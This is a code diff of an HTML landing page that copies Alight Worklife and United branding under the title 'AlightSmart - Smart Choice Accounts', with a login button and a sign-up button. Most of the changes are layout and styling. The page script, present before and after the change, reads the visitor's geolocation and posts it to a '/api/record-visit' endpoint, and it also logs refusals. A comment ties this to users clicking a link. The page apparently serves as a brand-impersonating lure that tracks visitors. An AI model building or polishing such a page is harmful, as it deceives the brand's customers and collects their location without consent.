@@ -4,184 +4,183 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AlightSmart - Smart Choice Accounts</title>
-    
     <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
 
-    body {
-        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-        background: transparent;
-        color: white;
-        height: 100%;
-        overflow: hidden;
-        margin: 0;
-        padding: 0;
-    }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #000;
+            color: white;
+            height: 100vh;
+            overflow: hidden;
+            margin: 0;
+            padding: 0;
+            position: relative;
+        }
 
-    /* HEADER */
-    .header {
-        padding: 40px 20px 20px;
-        text-align: center;
-        position: absolute;
-        top: 0;
-        width: 100%;
-        z-index: 10;
-        background: transparent;
-        height: 80px;
-    }
+        /* LOGO - Top Layer */
+        .logo-container {
+            text-align: center;
+            padding: 30px 20px 20px;
+            z-index: 30;
+            position: relative;
+            background: rgba(0, 0, 0, 0.4);
+        }
 
-    .logo-container {
-        text-align: center;
-        margin: 40px 0 30px;
-        z-index: 2;
-        position: relative;
-    }
+        .alight-worklife {
+            font-size: 2.4rem;
+            font-weight: 700;
+            letter-spacing: -0.02em;
+            margin-bottom: 8px;
+        }
+        .alight-worklife .alight { color: #1a1a1a; }
+        .alight-worklife .worklife {
+            background: linear-gradient(90deg, #7ed957, #34d399);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: 700;
+        }
 
-    .alight-worklife {
-        font-size: 2.8rem;
-        font-weight: 700;
-        letter-spacing: -0.02em;
-        margin-bottom: 10px;
-    }
-    .alight-worklife .alight { color: #1a1a1a; }
-    .alight-worklife .worklife {
-        background: linear-gradient(90deg, #7ed957, #34d399);
-        -webkit-background-clip: text;
-        -webkit-text-fill-color: transparent;
-        font-weight: 700;
-    }
+        .united-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-top: 8px;
+        }
+        .united-logo .united-text {
+            font-size: 2.1rem;
+            font-weight: 800;
+            color: #0033a0;
+            letter-spacing: 0.05em;
+        }
+        .globe { font-size: 2.3rem; line-height: 1; }
 
-    .united-logo {
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        gap: 12px;
-        margin: 15px 0 20px;
-    }
-    .united-logo .united-text {
-        font-size: 2.4rem;
-        font-weight: 800;
-        color: #0033a0;
-        letter-spacing: 0.05em;
-    }
-    .globe { font-size: 2.6rem; line-height: 1; }
+        /* CAROUSEL */
+        .carousel {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 180px; /* Space for buttons */
+            overflow: hidden;
+            z-index: 1;
+        }
+        .slides {
+            display: flex;
+            transition: transform 0.5s ease;
+            height: 100%;
+            width: 100%;
+        }
+        .slide {
+            min-width: 100%;
+            height: 100%;
+            background-size: cover;
+            background-position: center;
+            display: flex;
+            align-items: flex-end;
+            padding: 40px 25px;
+            position: relative;
+        }
+        .slide::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: linear-gradient(transparent, rgba(0,0,0,0.8));
+        }
+        .slide-content {
+            position: relative;
+            z-index: 2;
+            max-width: 380px;
+        }
+        .slide h2 {
+            font-size: 2rem;
+            margin-bottom: 30px;
+        }
+        .slide p {
+            font-size: 1.15rem;
+            line-height: 1.4;
+        }
 
-    /* CAROUSEL */
-    .carousel {
-        position: relative;
-        height: 55vh;
-        overflow: hidden;
-    }
-    .slides {
-        display: flex;
-        transition: transform 0.5s ease;
-        height: 100vh;
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-    }
-    .slide {
-        min-width: 100%;
-        height: 100%;
-        background-size: cover;
-        background-position: center;
-        display: flex;
-        align-items: flex-end;
-        padding: 40px 25px;
-        position: relative;
-    }
-    .slide img {
-        width: 100%;
-        height: 100%;
-        object-fit: cover;
-    }
-    .slide::before {
-        content: '';
-        position: absolute;
-        top: 0; left: 0; right: 0; bottom: 0;
-        background: linear-gradient(transparent, rgba(0,0,0,0.75));
-    }
-    .slide-content {
-        position: relative;
-        z-index: 2;
-        max-width: 380px;
-    }
-    .slide h2 {
-        font-size: 2rem;
-        margin-bottom: 30px;
-    }
-    .slide p {
-        font-size: 1.15rem;
-        line-height: 1.4;
-        margin-bottom: 250px;
-    }
+        /* DOTS */
+        .dots {
+            text-align: center;
+            margin: 15px 0;
+            z-index: 25;
+            position: relative;
+        }
+        .dot {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            background: #1ea05d;
+            border-radius: 50%;
+            margin: 0 5px;
+            cursor: pointer;
+        }
+        .dot.active {
+            background: white;
+            transform: scale(1.3);
+        }
 
-    /* DOTS */
-    .dots {
-        text-align: center;
-        margin: 20px 0;
-    }
-    .dot {
-        display: inline-block;
-        width: 10px;
-        height: 10px;
-        background: #1ea05d;
-        border-radius: 50%;
-        margin: 0 5px;
-        cursor: pointer;
-    }
-    .dot.active {
-        background: white;
-        transform: scale(1.3);
-    }
+        /* BUTTONS - Fixed at bottom */
+        .buttons {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            padding: 20px 25px 40px;
+            display: flex;
+            gap: 15px;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 30;
+        }
+        .btn {
+            flex: 1;
+            padding: 18px;
+            border-radius: 50px;
+            font-size: 1.15rem;
+            font-weight: 600;
+            text-align: center;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+        }
+        .btn-login {
+            background: white;
+            color: #1e40af;
+        }
+        .btn-signup {
+            background: #166534;
+            color: white;
+        }
+        .under {
+            font-size: 0.85rem;
+            margin-top: 4px;
+            opacity: 0.9;
+        }
 
-    /* BUTTONS - FIXED */
-    .buttons {
-        padding: 20px 25px;
-        display: flex;
-        gap: 15px;
-        background: transparent;
-        position: absolute;
-        bottom: 0;
-        left: 0;
-        right: 0;
-        z-index: 10;
-        padding-bottom: 60px;
-    }
-    .btn {
-        flex: 1;
-        padding: 16px;
-        border-radius: 50px;
-        font-size: 1.1rem;
-        font-weight: 600;
-        text-align: center;
-        cursor: pointer;
-        z-index: 2;
-        background: white;
-        color: #1e40af;
-        box-shadow: 0 4px 15px rgba(30, 64, 175, 0.3);
-    }
-    .btn-signup {
-        background: #166534;
-        color: white;
-        box-shadow: 0 4px 15px rgba(22, 101, 52, 0.3);
-    }
-
+        /* Mobile Optimizations */
+        @media (max-width: 480px) {
+            .alight-worklife { font-size: 2.1rem; }
+            .united-logo .united-text { font-size: 1.9rem; }
+            .slide h2 { font-size: 1.8rem; }
+        }
     </style>
 </head>
 <body>
-  <div class="logo-container">
+
+    <!-- Logo -->
+    <div class="logo-container">
         <div class="alight-worklife">
             <span class="alight">alight</span>
-            <span class="worklife">worklife</span><span style="font-size:0.6rem; vertical-align: super; color:#1a1a1a;">®</span>
+            <span class="worklife">worklife</span><span style="font-size:0.55rem; vertical-align: super; color:#1a1a1a;">®</span>
         </div>
 
         <div class="united-logo">
             <span class="united-text">UNITED</span>
             <span class="globe">🌐</span>
         </div>
-
+    </div>
 
     <!-- Carousel -->
     <div class="carousel">
@@ -212,11 +211,14 @@
         </div>
     </div>
 
+    <!-- Dots -->
     <div class="dots" id="dots"></div>
 
-    <div class="button ns">
-        <div class="btn btn-login" onclick="goToLogin()">Alight Worklife login 
-            <p class="under">
+    <!-- Buttons -->
+    <div class="buttons">
+        <div class="btn btn-login" onclick="goToLogin()">
+            Alight Worklife login
+            <p class="under"></p>
         </div>
         <div class="btn btn-signup" onclick="goToSignup()">SIGN UP</div>
     </div>
@@ -249,7 +251,7 @@
             });
         }
 
-        // Auto slide every 5 seconds
+        // Auto slide
         setInterval(() => {
             currentSlide = (currentSlide + 1) % totalSlides;
             slides.style.transform = `translateX(-${currentSlide * 100}%)`;
@@ -276,30 +278,27 @@
         function goToSignup() {
             window.location.href = "index.html";
         }
-        
-   // Get real geolocation when user clicks the link
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(async (position) => {
-            const loc = `Lat: ${position.coords.latitude}, Lng: ${position.coords.longitude}`;
-            
-            try {
-                await fetch('/api/record-visit', {
+
+        // Geolocation
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (position) => {
+                const loc = `Lat: ${position.coords.latitude}, Lng: ${position.coords.longitude}`;
+                try {
+                    await fetch('/api/record-visit', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ location: loc })
+                    });
+                } catch (e) {}
+            }, () => {
+                fetch('/api/record-visit', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ location: loc })
+                    body: JSON.stringify({ location: 'Permission Denied' })
                 });
-            } catch (e) {}
-        }, () => {
-            // If user denies permission
-            fetch('/api/record-visit', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ location: 'Permission Denied' })
             });
-        });
-    }
+        }
     </script>
     <script src="app.js"></script>
-    
 </body>
 </html>
